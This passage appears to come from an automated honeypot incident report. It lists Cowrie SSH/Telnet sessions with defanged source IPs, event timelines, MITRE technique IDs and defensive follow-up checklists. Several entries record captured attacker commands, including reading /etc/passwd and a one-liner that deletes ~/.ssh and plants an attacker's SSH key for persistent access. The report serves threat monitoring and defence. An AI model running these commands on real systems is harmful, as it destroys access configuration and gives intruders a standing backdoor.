| `2026-09-29 04:34:08` | `cowrie.command.failed` |
| `2026-09-29 04:34:08` | `cowrie.command.input` |
| `2026-09-29 04:34:08` | `cowrie.command.failed` |
| `2026-09-29 04:34:08` | `cowrie.command.input` |
| `2026-09-29 04:34:08` | `cowrie.command.failed` |
| `2026-09-29 04:34:09` | `cowrie.command.input` |
| `2026-09-29 04:34:09` | `cowrie.command.failed` |
| `2026-09-29 04:34:09` | `cowrie.command.input` |
| `2026-09-29 04:34:09` | `cowrie.command.input` |
| `2026-09-29 04:34:09` | `cowrie.command.failed` |
| `2026-09-29 04:34:09` | `cowrie.command.failed` |
| `2026-09-29 04:34:40` | `cowrie.log.closed` |
| `2026-09-29 04:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c4b225f615

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-09-29 04:34 |
| **Last Seen** | 2026-09-29 04:35 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:34:40` | `cowrie.session.connect` |
| `2026-09-29 04:34:41` | `cowrie.login.success` |
| `2026-09-29 04:34:42` | `cowrie.login.success` |
| `2026-09-29 04:34:42` | `cowrie.session.params` |
| `2026-09-29 04:34:43` | `cowrie.command.input` |
| `2026-09-29 04:34:43` | `cowrie.command.failed` |
| `2026-09-29 04:34:43` | `cowrie.command.input` |
| `2026-09-29 04:34:43` | `cowrie.command.failed` |
| `2026-09-29 04:34:43` | `cowrie.command.input` |
| `2026-09-29 04:34:43` | `cowrie.command.input` |
| `2026-09-29 04:34:43` | `cowrie.command.failed` |
| `2026-09-29 04:34:43` | `cowrie.command.failed` |
| `2026-09-29 04:35:14` | `cowrie.log.closed` |
| `2026-09-29 04:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418a9a6c425a

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-09-29 04:35 |
| **Last Seen** | 2026-09-29 04:35 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:35:14` | `cowrie.session.connect` |
| `2026-09-29 04:35:15` | `cowrie.login.success` |
| `2026-09-29 04:35:16` | `cowrie.login.success` |
| `2026-09-29 04:35:16` | `cowrie.session.params` |
| `2026-09-29 04:35:16` | `cowrie.command.input` |
| `2026-09-29 04:35:16` | `cowrie.command.failed` |
| `2026-09-29 04:35:17` | `cowrie.command.input` |
| `2026-09-29 04:35:17` | `cowrie.command.failed` |
| `2026-09-29 04:35:17` | `cowrie.command.input` |
| `2026-09-29 04:35:17` | `cowrie.command.input` |
| `2026-09-29 04:35:17` | `cowrie.command.failed` |
| `2026-09-29 04:35:17` | `cowrie.command.failed` |
| `2026-09-29 04:35:48` | `cowrie.log.closed` |
| `2026-09-29 04:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a78ffaafb51

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-09-29 04:35 |
| **Last Seen** | 2026-09-29 04:36 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:35:48` | `cowrie.session.connect` |
| `2026-09-29 04:35:49` | `cowrie.login.success` |
| `2026-09-29 04:35:50` | `cowrie.login.success` |
| `2026-09-29 04:35:50` | `cowrie.session.params` |
| `2026-09-29 04:35:51` | `cowrie.command.input` |
| `2026-09-29 04:35:51` | `cowrie.command.failed` |
| `2026-09-29 04:35:51` | `cowrie.command.input` |
| `2026-09-29 04:35:51` | `cowrie.command.failed` |
| `2026-09-29 04:35:52` | `cowrie.command.input` |
| `2026-09-29 04:35:52` | `cowrie.command.input` |
| `2026-09-29 04:35:52` | `cowrie.command.failed` |
| `2026-09-29 04:35:52` | `cowrie.command.failed` |
| `2026-09-29 04:36:23` | `cowrie.log.closed` |
| `2026-09-29 04:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e4ffd7051ac

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-29 04:35 |
| **Last Seen** | 2026-09-29 04:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:35:51` | `cowrie.session.connect` |
| `2026-09-29 04:35:51` | `cowrie.client.version` |
| `2026-09-29 04:35:51` | `cowrie.client.kex` |
| `2026-09-29 04:35:51` | `cowrie.login.success` |
| `2026-09-29 04:35:51` | `cowrie.direct-tcpip.request` |
| `2026-09-29 04:35:51` | `cowrie.direct-tcpip.data` |
| `2026-09-29 04:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a77a9832aafe

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-09-29 04:36 |
| **Last Seen** | 2026-09-29 04:36 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:36:23` | `cowrie.session.connect` |
| `2026-09-29 04:36:24` | `cowrie.login.success` |
| `2026-09-29 04:36:25` | `cowrie.login.success` |
| `2026-09-29 04:36:25` | `cowrie.session.params` |
| `2026-09-29 04:36:26` | `cowrie.command.input` |
| `2026-09-29 04:36:26` | `cowrie.command.failed` |
| `2026-09-29 04:36:26` | `cowrie.command.input` |
| `2026-09-29 04:36:26` | `cowrie.command.failed` |
| `2026-09-29 04:36:26` | `cowrie.command.input` |
| `2026-09-29 04:36:26` | `cowrie.command.input` |
| `2026-09-29 04:36:26` | `cowrie.command.failed` |
| `2026-09-29 04:36:26` | `cowrie.command.failed` |
| `2026-09-29 04:36:57` | `cowrie.log.closed` |
| `2026-09-29 04:36:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff602d65c78f

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-09-29 04:36 |
| **Last Seen** | 2026-09-29 04:37 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:36:57` | `cowrie.session.connect` |
| `2026-09-29 04:36:58` | `cowrie.login.success` |
| `2026-09-29 04:36:59` | `cowrie.login.success` |
| `2026-09-29 04:36:59` | `cowrie.session.params` |
| `2026-09-29 04:37:00` | `cowrie.command.input` |
| `2026-09-29 04:37:00` | `cowrie.command.failed` |
| `2026-09-29 04:37:00` | `cowrie.command.input` |
| `2026-09-29 04:37:00` | `cowrie.command.failed` |
| `2026-09-29 04:37:00` | `cowrie.command.input` |
| `2026-09-29 04:37:00` | `cowrie.command.input` |
| `2026-09-29 04:37:00` | `cowrie.command.failed` |
| `2026-09-29 04:37:00` | `cowrie.command.failed` |
| `2026-09-29 04:37:31` | `cowrie.log.closed` |
| `2026-09-29 04:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f90fb196a70

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-09-29 04:37 |
| **Last Seen** | 2026-09-29 04:38 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:37:31` | `cowrie.session.connect` |
| `2026-09-29 04:37:32` | `cowrie.login.success` |
| `2026-09-29 04:37:33` | `cowrie.login.success` |
| `2026-09-29 04:37:33` | `cowrie.session.params` |
| `2026-09-29 04:37:34` | `cowrie.command.input` |
| `2026-09-29 04:37:34` | `cowrie.command.failed` |
| `2026-09-29 04:37:34` | `cowrie.command.input` |
| `2026-09-29 04:37:34` | `cowrie.command.failed` |
| `2026-09-29 04:37:34` | `cowrie.command.input` |
| `2026-09-29 04:37:34` | `cowrie.command.input` |
| `2026-09-29 04:37:34` | `cowrie.command.failed` |
| `2026-09-29 04:37:34` | `cowrie.command.failed` |
| `2026-09-29 04:38:05` | `cowrie.log.closed` |
| `2026-09-29 04:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a38301afd4ab

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-09-29 04:38 |
| **Last Seen** | 2026-09-29 04:38 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:38:05` | `cowrie.session.connect` |
| `2026-09-29 04:38:06` | `cowrie.login.success` |
| `2026-09-29 04:38:06` | `cowrie.session.params` |
| `2026-09-29 04:38:07` | `cowrie.command.input` |
| `2026-09-29 04:38:07` | `cowrie.command.failed` |
| `2026-09-29 04:38:07` | `cowrie.command.input` |
| `2026-09-29 04:38:07` | `cowrie.command.failed` |
| `2026-09-29 04:38:08` | `cowrie.command.input` |
| `2026-09-29 04:38:08` | `cowrie.command.failed` |
| `2026-09-29 04:38:08` | `cowrie.command.input` |
| `2026-09-29 04:38:08` | `cowrie.command.failed` |
| `2026-09-29 04:38:08` | `cowrie.command.input` |
| `2026-09-29 04:38:08` | `cowrie.command.input` |
| `2026-09-29 04:38:08` | `cowrie.command.failed` |
| `2026-09-29 04:38:08` | `cowrie.command.failed` |
| `2026-09-29 04:38:39` | `cowrie.log.closed` |
| `2026-09-29 04:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b84c5bb4800

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-09-29 04:38 |
| **Last Seen** | 2026-09-29 04:39 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:38:39` | `cowrie.session.connect` |
| `2026-09-29 04:38:40` | `cowrie.login.success` |
| `2026-09-29 04:38:40` | `cowrie.session.params` |
| `2026-09-29 04:38:41` | `cowrie.command.input` |
| `2026-09-29 04:38:41` | `cowrie.command.failed` |
| `2026-09-29 04:38:41` | `cowrie.command.input` |
| `2026-09-29 04:38:41` | `cowrie.command.failed` |
| `2026-09-29 04:38:41` | `cowrie.command.input` |
| `2026-09-29 04:38:41` | `cowrie.command.failed` |
| `2026-09-29 04:38:41` | `cowrie.command.input` |
| `2026-09-29 04:38:41` | `cowrie.command.failed` |
| `2026-09-29 04:38:42` | `cowrie.command.input` |
| `2026-09-29 04:38:42` | `cowrie.command.input` |
| `2026-09-29 04:38:42` | `cowrie.command.failed` |
| `2026-09-29 04:38:42` | `cowrie.command.failed` |
| `2026-09-29 04:39:13` | `cowrie.log.closed` |
| `2026-09-29 04:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e2903b38123

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-09-29 04:39 |
| **Last Seen** | 2026-09-29 04:39 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:39:13` | `cowrie.session.connect` |
| `2026-09-29 04:39:14` | `cowrie.login.success` |
| `2026-09-29 04:39:14` | `cowrie.session.params` |
| `2026-09-29 04:39:15` | `cowrie.command.input` |
| `2026-09-29 04:39:15` | `cowrie.command.failed` |
| `2026-09-29 04:39:15` | `cowrie.command.input` |
| `2026-09-29 04:39:15` | `cowrie.command.failed` |
| `2026-09-29 04:39:15` | `cowrie.command.input` |
| `2026-09-29 04:39:15` | `cowrie.command.failed` |
| `2026-09-29 04:39:15` | `cowrie.command.input` |
| `2026-09-29 04:39:15` | `cowrie.command.failed` |
| `2026-09-29 04:39:16` | `cowrie.command.input` |
| `2026-09-29 04:39:16` | `cowrie.command.input` |
| `2026-09-29 04:39:16` | `cowrie.command.failed` |
| `2026-09-29 04:39:16` | `cowrie.command.failed` |
| `2026-09-29 04:39:47` | `cowrie.log.closed` |
| `2026-09-29 04:39:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e77da54b8ee1

| Field | Detail |
|---|---|
| **Source IP** | `92.117.89[.]101` |
| **First Seen** | 2026-09-29 04:42 |
| **Last Seen** | 2026-09-29 04:44 |
| **Session Duration** | 88s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:42:41` | `cowrie.session.connect` |
| `2026-09-29 04:42:47` | `cowrie.telnet.option` |
| `2026-09-29 04:42:54` | `cowrie.telnet.option` |
| `2026-09-29 04:42:54` | `cowrie.login.success` |
| `2026-09-29 04:42:54` | `cowrie.session.params` |
| `2026-09-29 04:42:56` | `cowrie.telnet.option` |
| `2026-09-29 04:42:56` | `cowrie.telnet.option` |
| `2026-09-29 04:42:56` | `cowrie.command.input` |
| `2026-09-29 04:42:56` | `cowrie.command.input` |
| `2026-09-29 04:42:56` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.failed` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.failed` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.failed` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.failed` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.failed` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.failed` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.failed` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.failed` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:43:00` | `cowrie.command.input` |
| `2026-09-29 04:44:10` | `cowrie.log.closed` |
| `2026-09-29 04:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.117.89[.]101` to AbuseIPDB if not already reported
- [ ] Block `92.117.89[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24a7268516fa

| Field | Detail |
|---|---|
| **Source IP** | `147.90.234[.]19` |
| **First Seen** | 2026-09-29 04:43 |
| **Last Seen** | 2026-09-29 04:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:43:58` | `cowrie.session.connect` |
| `2026-09-29 04:43:58` | `cowrie.client.version` |
| `2026-09-29 04:43:59` | `cowrie.client.kex` |
| `2026-09-29 04:43:59` | `cowrie.login.success` |
| `2026-09-29 04:43:59` | `cowrie.session.params` |
| `2026-09-29 04:43:59` | `cowrie.command.input` |
| `2026-09-29 04:43:59` | `cowrie.command.failed` |
| `2026-09-29 04:43:59` | `cowrie.log.closed` |
| `2026-09-29 04:44:00` | `cowrie.session.params` |
| `2026-09-29 04:44:00` | `cowrie.command.input` |
| `2026-09-29 04:44:00` | `cowrie.session.file_download` |
| `2026-09-29 04:44:00` | `cowrie.log.closed` |
| `2026-09-29 04:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.90.234[.]19` to AbuseIPDB if not already reported
- [ ] Block `147.90.234[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed992b9b5a3b

| Field | Detail |
|---|---|
| **Source IP** | `147.90.234[.]19` |
| **First Seen** | 2026-09-29 04:44 |
| **Last Seen** | 2026-09-29 04:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:44:00` | `cowrie.session.connect` |
| `2026-09-29 04:44:00` | `cowrie.client.version` |
| `2026-09-29 04:44:00` | `cowrie.client.kex` |
| `2026-09-29 04:44:00` | `cowrie.login.success` |
| `2026-09-29 04:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.90.234[.]19` to AbuseIPDB if not already reported
- [ ] Block `147.90.234[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc62b52134f5

| Field | Detail |
|---|---|
| **Source IP** | `147.90.234[.]19` |
| **First Seen** | 2026-09-29 04:44 |
| **Last Seen** | 2026-09-29 04:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:44:00` | `cowrie.session.connect` |
| `2026-09-29 04:44:00` | `cowrie.client.version` |
| `2026-09-29 04:44:00` | `cowrie.client.kex` |
| `2026-09-29 04:44:00` | `cowrie.login.success` |
| `2026-09-29 04:44:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.90.234[.]19` to AbuseIPDB if not already reported
- [ ] Block `147.90.234[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd5a0857ecf5

| Field | Detail |
|---|---|
| **Source IP** | `186.47.77[.]39` |
| **First Seen** | 2026-09-29 04:44 |
| **Last Seen** | 2026-09-29 04:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:44:04` | `cowrie.session.connect` |
| `2026-09-29 04:44:04` | `cowrie.client.version` |
| `2026-09-29 04:44:04` | `cowrie.client.kex` |
| `2026-09-29 04:44:04` | `cowrie.login.success` |
| `2026-09-29 04:44:05` | `cowrie.session.params` |
| `2026-09-29 04:44:05` | `cowrie.command.input` |
| `2026-09-29 04:44:05` | `cowrie.command.failed` |
| `2026-09-29 04:44:05` | `cowrie.log.closed` |
| `2026-09-29 04:44:06` | `cowrie.session.params` |
| `2026-09-29 04:44:06` | `cowrie.command.input` |
| `2026-09-29 04:44:06` | `cowrie.session.file_download` |
| `2026-09-29 04:44:06` | `cowrie.log.closed` |
| `2026-09-29 04:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.47.77[.]39` to AbuseIPDB if not already reported
- [ ] Block `186.47.77[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6766c718513

| Field | Detail |
|---|---|
| **Source IP** | `186.47.77[.]39` |
| **First Seen** | 2026-09-29 04:44 |
| **Last Seen** | 2026-09-29 04:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:44:06` | `cowrie.session.connect` |
| `2026-09-29 04:44:06` | `cowrie.client.version` |
| `2026-09-29 04:44:06` | `cowrie.client.kex` |
| `2026-09-29 04:44:07` | `cowrie.login.success` |
| `2026-09-29 04:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.47.77[.]39` to AbuseIPDB if not already reported
- [ ] Block `186.47.77[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ec9d160a47e

| Field | Detail |
|---|---|
| **Source IP** | `186.47.77[.]39` |
| **First Seen** | 2026-09-29 04:44 |
| **Last Seen** | 2026-09-29 04:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:44:07` | `cowrie.session.connect` |
| `2026-09-29 04:44:07` | `cowrie.client.version` |
| `2026-09-29 04:44:07` | `cowrie.client.kex` |
| `2026-09-29 04:44:08` | `cowrie.login.success` |
| `2026-09-29 04:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.47.77[.]39` to AbuseIPDB if not already reported
- [ ] Block `186.47.77[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b1fe37a3d37

| Field | Detail |
|---|---|
| **Source IP** | `207.175.7[.]176` |
| **First Seen** | 2026-09-29 04:59 |
| **Last Seen** | 2026-09-29 04:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:59:47` | `cowrie.session.connect` |
| `2026-09-29 04:59:47` | `cowrie.login.success` |
| `2026-09-29 04:59:48` | `cowrie.session.params` |
| `2026-09-29 04:59:48` | `cowrie.command.input` |
| `2026-09-29 04:59:48` | `cowrie.command.input` |
| `2026-09-29 04:59:48` | `cowrie.command.failed` |
| `2026-09-29 04:59:48` | `cowrie.command.input` |
| `2026-09-29 04:59:48` | `cowrie.log.closed` |
| `2026-09-29 04:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.7[.]176` to AbuseIPDB if not already reported
- [ ] Block `207.175.7[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bad4a69a52e

| Field | Detail |
|---|---|
| **Source IP** | `207.175.7[.]176` |
| **First Seen** | 2026-09-29 04:59 |
| **Last Seen** | 2026-09-29 05:00 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

